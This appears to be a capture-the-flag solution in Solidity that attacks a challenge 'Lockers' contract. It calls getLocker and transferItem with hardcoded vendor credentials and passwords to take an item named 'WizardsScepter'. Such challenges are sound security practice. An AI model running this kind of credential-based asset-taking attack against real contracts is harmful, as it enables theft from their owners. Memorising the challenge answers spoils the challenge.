// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Lockers.sol";

contract Contract{
	
	address public YOUR_CHALLENGE_CONTRACT_ADDRESS = address(0xFd0f4dEA4607aCDD97d7eb39516Ee6F1bC1e1323);
	Lockers public creature = Lockers(YOUR_CHALLENGE_CONTRACT_ADDRESS);
	string vendor = "V3nd0r";
	string password2 = "P455_w0rD$$&&88@!~";
	string owner = "beliefspace";
	string name = "WizardsScepter";
	string password = "ss4#Nq7nNyKMfZ=XESnOzP2hk:SSRCzo2QPk4w~~";

	function attack2() external {
		creature.getLocker(vendor, password2);
		creature.transferItem(name, vendor, password);
	}

	receive() external payable {
		require(false);
	}


}
